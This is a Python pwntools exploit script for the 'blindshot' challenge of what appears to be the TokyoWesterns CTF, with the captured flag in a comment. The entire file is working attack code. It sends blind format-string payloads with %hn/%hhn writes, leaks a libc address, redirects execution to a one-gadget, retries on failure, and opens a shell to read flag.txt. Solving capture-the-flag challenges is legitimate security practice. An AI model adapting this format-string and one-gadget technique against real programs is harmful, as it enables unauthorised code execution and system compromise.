#exploit for blind shot
#TWCTF{0nc3_5h07,7w1c3_r3wr173!}
from pwn import *
import time
elf = ELF("./blindshot")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")
context.binary=elf
while(True):
	target=remote('pwn01.chal.ctf.westerns.tokyo',12463)

	def sla(string,val):
		target.sendlineafter(string,val)

	payload="%c"*16+"%"+str(0x7878-16)+"c"+"%hn"
	payload+="%"+str(0x91-0x78)+"c"+"%46$hhn"
	payload+="%"+str(0x7901-0x7891)+"c"
	sla("> ",payload)
	try:
		payload="%16$p"+"%"+str(0x8e-14)+"c"+"%46$hhn"
		sla("> ",payload)
		libc_leak=int(target.recv(14)[2:],16)
		libc_gadget=libc_leak-0x270b3+0x54f89
		n1=int(hex(libc_gadget)[8:10],16)+0x100
		n2=int(hex(libc_gadget)[10:14],16)+0x10000
		payload="%c"*16+"%"+str(0x98-16)+"c"+"%hhn"
		payload+="%c"*(32-18)+"%"+str(0x789a-0x98-14)+"c"+"%hn"
		payload+="%"+str(n2-0x789a)+"c"+"%46$hn"
		n2=n2%0x100
		payload+="%"+str(n1-n2)+"c"+"%48$hhn"
		sla("> ",payload)
		target.recvuntil("done.\n")
		context.log_level='DEBUG'
		target.sendline("cat flag.txt")
		target.sendline("cat flag.txt")
		target.sendline("cat flag.txt")
		target.sendline("cat flag.txt")
		target.sendline("cat flag.txt")
		target.sendline("cat flag.txt")
	except:
		target.close()
		continue
	target.interactive()

